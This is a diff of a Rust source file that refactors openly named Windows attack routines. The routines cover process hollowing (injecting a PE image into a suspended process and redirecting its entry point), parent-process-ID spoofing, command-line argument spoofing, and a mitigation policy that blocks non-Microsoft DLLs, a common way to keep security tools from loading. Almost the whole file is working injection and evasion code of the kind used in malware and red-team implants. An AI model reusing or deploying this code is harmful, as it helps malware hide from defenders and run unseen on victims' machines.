@@ -7,16 +7,16 @@ use windows::{
         System::{
             Diagnostics::Debug::{
                 GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
-                CONTEXT_FULL_AMD64, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+                CONTEXT_FULL_AMD64, IMAGE_NT_HEADERS64,
             },
             LibraryLoader::GetModuleFileNameA,
             Memory::{VirtualAllocEx, PAGE_EXECUTE_READWRITE, VIRTUAL_ALLOCATION_TYPE},
-            SystemServices::{IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER},
+            SystemServices::IMAGE_BASE_RELOCATION,
             Threading::{
                 CreateProcessA, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
                 OpenProcess, ResumeThread, UpdateProcThreadAttribute, CREATE_SUSPENDED,
                 EXTENDED_STARTUPINFO_PRESENT, LPPROC_THREAD_ATTRIBUTE_LIST, PEB,
-                PROCESS_BASIC_INFORMATION, PROCESS_CREATE_PROCESS, PROCESS_CREATION_FLAGS,
+                PROCESS_BASIC_INFORMATION, PROCESS_CREATE_PROCESS,
                 PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, RTL_USER_PROCESS_PARAMETERS, STARTUPINFOA,
                 STARTUPINFOEXA,
@@ -24,6 +24,14 @@ use windows::{
         },
     },
 };
+
+mod winpe;
+use winpe::{parse, RelocationEntry, utils};
+
+// Constants for process creation and PE parsing
+const PEB_IMAGE_BASE_OFFSET: u64 = 0x10;
+const PROCESS_MITIGATION_POLICY: u64 = 0x100000000000; // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+const RELOC_DIR_INDEX: usize = 5; // DataDirectory index for base relocations
 
 pub fn get_current_filename() -> String {
     let mut buffer: [u8; 260] = [0; 260]; // MAX_PATH is typically 260
@@ -33,77 +41,43 @@ pub fn get_current_filename() -> String {
         .expect("Failed to convert buffer to String")
 }
 
-// https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only
-#[derive(Debug, Copy, Clone)]
-struct ImageRelocationEntry {
-    data: u16,
-}
+/// Helper function to initialize process thread attribute list for extended startup info
+fn setup_proc_thread_attribute_list() -> (STARTUPINFOEXA, Box<[u8]>) {
+    let mut startup_info = STARTUPINFOEXA::default();
+    startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;
 
-impl ImageRelocationEntry {
-    // Getter for the offset field
-    fn offset(&self) -> u16 {
-        self.data & 0x0FFF
-    }
+    // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
+    let mut lp_size = 0;
+    unsafe {
+        let _ = InitializeProcThreadAttributeList(
+            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
+            1,
+            0,
+            &mut lp_size,
+        );
+    };
 
-    // Getter for the type field
-    fn type_(&self) -> u8 {
-        (self.data >> 12) as u8
-    }
-}
+    // Create the memory needed for the attribute list
+    let mut attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
+    startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
+    
+    // Initialize the list
+    unsafe {
+        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lp_size);
+    };
 
-fn get_file_offset(
-    rva: usize,
-    nt_headers: IMAGE_NT_HEADERS64,
-    section_header: *const IMAGE_SECTION_HEADER,
-) -> usize {
-    for i in 0..nt_headers.FileHeader.NumberOfSections {
-        let curr_section_header = unsafe { *(section_header.add(i as usize)) };
-        let end_of_header = curr_section_header.VirtualAddress + curr_section_header.SizeOfRawData;
-        if end_of_header as usize >= rva {
-            return rva - curr_section_header.VirtualAddress as usize
-                + curr_section_header.PointerToRawData as usize;
-        }
-    }
-
-    panic!("Could not find correct section!");
-}
-
-fn get_reloc_section(
-    relocation_table_address: u32,
-    nt_headers: IMAGE_NT_HEADERS64,
-    section_header: *const IMAGE_SECTION_HEADER,
-) -> IMAGE_SECTION_HEADER {
-    for i in 0..nt_headers.FileHeader.NumberOfSections {
-        let curr_section_header = unsafe { *(section_header.add(i as usize)) };
-        if relocation_table_address == curr_section_header.VirtualAddress {
-            return curr_section_header;
-        }
-    }
-
-    panic!("Could not find reloc section!");
-}
-
-fn get_address(contents: &Vec<u8>, offset: usize) -> i64 {
-    let slice = &contents[offset..offset + 8];
-    let array: [u8; 8] = slice.try_into().expect("slice with incorrect length"); 
-    return i64::from_le_bytes(array);
-}
-
-fn write_address(contents: &mut Vec<u8>, offset: usize, address: i64) {
-    let bytes = address.to_le_bytes();
-    contents[offset..offset + 8].copy_from_slice(&bytes);
+    (startup_info, attribute_list)
 }
 
 // This currently works only for x64. For x86 registers and offsets need to be adjusted.
 pub fn process_hollowing(filename: String) {
     let mut contents = fs::read(filename.clone()).expect("Could not read file");
+    let pe = parse(contents.clone());
 
-    let dos_header = contents.as_ptr() as *const IMAGE_DOS_HEADER;
-    let nt_headers = unsafe {
-        (contents.as_ptr().add((*dos_header).e_lfanew as usize)) as *mut IMAGE_NT_HEADERS64
-    };
-    let section_header =
-        ((nt_headers as usize) + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
+    // Get headers from PE structure instead of raw pointers
+    let dos_header = pe.get_dos_header();
+    let nt_headers = pe.get_nt_headers_x64();
+    let section_header_ptr = pe.get_section_headers_ptr();
 
     let mut startup_info = STARTUPINFOA::default();
     startup_info.cb = size_of::<STARTUPINFOA>() as u32;
@@ -116,7 +90,7 @@ pub fn process_hollowing(filename: String) {
             None,
             None,
             false,
-            PROCESS_CREATION_FLAGS(0x00000004), //CREATE_SUSPENDED
+            CREATE_SUSPENDED,
             None,
             None,
             &startup_info,
@@ -141,22 +115,23 @@ pub fn process_hollowing(filename: String) {
             process_info.hProcess,
             //Some((*nt_headers).OptionalHeader.ImageBase as *const c_void),
             None,
-            (*nt_headers).OptionalHeader.SizeOfImage as usize,
+            nt_headers.OptionalHeader.SizeOfImage as usize,
             VIRTUAL_ALLOCATION_TYPE(0x3000),
             PAGE_EXECUTE_READWRITE,
         )
     };
 
     let delta_image =
-        unsafe { image_base.sub((*nt_headers).OptionalHeader.ImageBase as usize) } as i64;
-    let reloc_header = (unsafe { *nt_headers }).OptionalHeader.DataDirectory[5];
+        unsafe { image_base.sub(nt_headers.OptionalHeader.ImageBase as usize) } as i64;
+    let reloc_header = nt_headers.OptionalHeader.DataDirectory[RELOC_DIR_INDEX];
     // Check if a relocation header is present and if the image base is not the preferred image base
     if delta_image != 0 && reloc_header.VirtualAddress != 0 {
         // If so, do the relocation
         unsafe {
-            (*nt_headers).OptionalHeader.ImageBase = image_base as u64;
-            let image_relocation_section =
-                get_reloc_section(reloc_header.VirtualAddress, *nt_headers, section_header);
+            let nt_headers_mut = (contents.as_mut_ptr().add(dos_header.e_lfanew as usize)) as *mut IMAGE_NT_HEADERS64;
+            (*nt_headers_mut).OptionalHeader.ImageBase = image_base as u64;
+            
+            let image_relocation_section = pe.get_section_by_virtual_address(reloc_header.VirtualAddress);
             let mut reloc_offset: usize = 0;
             while reloc_offset < reloc_header.Size as usize {
                 let image_base_relocation = contents
@@ -167,23 +142,23 @@ pub fn process_hollowing(filename: String) {
                 reloc_offset += size_of::<IMAGE_BASE_RELOCATION>();
                 let number_of_entries = ((*image_base_relocation).SizeOfBlock as usize
                     - size_of::<IMAGE_BASE_RELOCATION>())
-                    / size_of::<ImageRelocationEntry>();
+                    / size_of::<RelocationEntry>();
                 for _ in 0..number_of_entries {
                     let image_relocation_entry = contents
                         .as_ptr()
                         .add(image_relocation_section.PointerToRawData as usize)
                         .add(reloc_offset)
-                        as *const ImageRelocationEntry;
-                    reloc_offset += size_of::<ImageRelocationEntry>();
+                        as *const RelocationEntry;
+                    reloc_offset += size_of::<RelocationEntry>();
                     if (*image_relocation_entry).type_() == 0 {
                         continue;
                     }
                     let relocation_address_va = (*image_base_relocation).VirtualAddress as usize
                         + (*image_relocation_entry).offset() as usize;
-                    let relocation_address_offset = get_file_offset(relocation_address_va, *nt_headers, section_header);
-                    let mut patched_address = get_address(&contents, relocation_address_offset);
+                    let relocation_address_offset = pe.rva_to_file_offset(relocation_address_va);
+                    let mut patched_address = utils::read_address(&contents, relocation_address_offset);
                     patched_address += delta_image;
-                    write_address(&mut contents, relocation_address_offset, patched_address);
+                    utils::write_address(&mut contents, relocation_address_offset, patched_address);
                 }
             }
         }
@@ -195,13 +170,13 @@ pub fn process_hollowing(filename: String) {
             process_info.hProcess,
             image_base as *const c_void,
             contents.as_ptr() as *const c_void,
-            (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
+            nt_headers.OptionalHeader.SizeOfHeaders as usize,
             None,
         )
         .expect("Could not write to process memory");
 
-        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
-            let curr_section_header = *(section_header.add(i as usize));
+        for i in 0..nt_headers.FileHeader.NumberOfSections {
+            let curr_section_header = *(section_header_ptr.add(i as usize));
             WriteProcessMemory(
                 process_info.hProcess,
                 image_base.add(curr_section_header.VirtualAddress as usize),
@@ -219,7 +194,7 @@ pub fn process_hollowing(filename: String) {
         if delta_image != 0 {
             WriteProcessMemory(
                 process_info.hProcess,
-                ((*ctx).Rdx + 0x10 as u64) as *const c_void,
+                ((*ctx).Rdx + PEB_IMAGE_BASE_OFFSET) as *const c_void,
                 &image_base as *const _ as *const c_void,
                 size_of::<*const c_void>() as usize,
                 None,
@@ -229,44 +204,22 @@ pub fn process_hollowing(filename: String) {
 
         // Change entrypoint of thread
         (*ctx).Rcx =
-            image_base.add((*nt_headers).OptionalHeader.AddressOfEntryPoint as usize) as u64;
+            image_base.add(nt_headers.OptionalHeader.AddressOfEntryPoint as usize) as u64;
         SetThreadContext(process_info.hThread, ctx).expect("Could not set thread context");
         ResumeThread(process_info.hThread);
     }
 }
 
 pub fn apply_process_mitigation_policy() {
-    let mut startup_info = STARTUPINFOEXA::default();
-    startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;
+    let (startup_info, _attribute_list) = setup_proc_thread_attribute_list();
 
-    // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
-    // We only use 1 argument (the mitigation policy)
-    let mut lp_size = 0;
-    unsafe {
-        let _ = InitializeProcThreadAttributeList(
-            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
-            1,
-            0,
-            &mut lp_size,
-        );
-    };
-
-    // Create the memory needed for the attribute list
-    let mut attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
-    startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
-    // Calling InitializeProcThreadAttributeList again to initialize the list
-    unsafe {
-        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lp_size);
-    };
-
-    // Update the list so that it contains the PPID
-    let policy: u64 = 0x100000000000; //  PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+    // Update the list so that it contains the mitigation policy
     unsafe {
         let _ = UpdateProcThreadAttribute(
             startup_info.lpAttributeList,
             0,
             PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY as usize,
-            Some(&policy as *const _ as *const c_void),
+            Some(&PROCESS_MITIGATION_POLICY as *const _ as *const c_void),
             size_of::<u64>(),
             None,
             None,
@@ -299,30 +252,9 @@ pub fn apply_process_mitigation_policy() {
 }
 
 pub fn spoof_ppid(ppid: u32) {
-    let mut startup_info = STARTUPINFOEXA::default();
-    startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;
+    let (startup_info, _attribute_list) = setup_proc_thread_attribute_list();
 
-    // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
-    // We only use 1 argument (the parent id process)
-    let mut lp_size = 0;
-    unsafe {
-        let _ = InitializeProcThreadAttributeList(
-            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
-            1,
-            0,
-            &mut lp_size,
-        );
-    };
-
-    // Create the memory needed for the attribute list
-    let mut attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
-    startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
-    // Calling InitializeProcThreadAttributeList again to initialize the list
-    unsafe {
-        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lp_size);
-    };
-
-    //Open handle to PPID
+    // Open handle to PPID
     let handle_parent = unsafe {
         OpenProcess(PROCESS_CREATE_PROCESS, false, ppid)
             .expect("Could not open handle to parent process.")
@@ -379,7 +311,7 @@ pub fn spoof_arguments() {
             None,
             None,
             false,
-            PROCESS_CREATION_FLAGS(0x00000004), //CREATE_SUSPENDED
+            CREATE_SUSPENDED,
             None,
             None,
             &startup_info,
